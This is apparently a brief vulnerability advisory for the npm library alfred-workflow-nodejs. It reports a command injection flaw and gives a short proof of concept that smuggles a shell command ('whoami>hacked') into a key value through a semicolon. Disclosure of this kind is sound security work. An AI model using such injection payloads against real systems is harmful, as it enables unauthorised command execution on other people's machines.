# Overview

alfred-workflow-nodejs is a library providing helpers to create Alfred Workflow.

Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using a semicolon char in any of the key values.

# Proof of Concept

```
var AlfredNode = require('alfred-workflow-nodejs');
var utils = AlfredNode.utils;

utils.wfVars.remove(' "; whoami>hacked #', false);
});
```
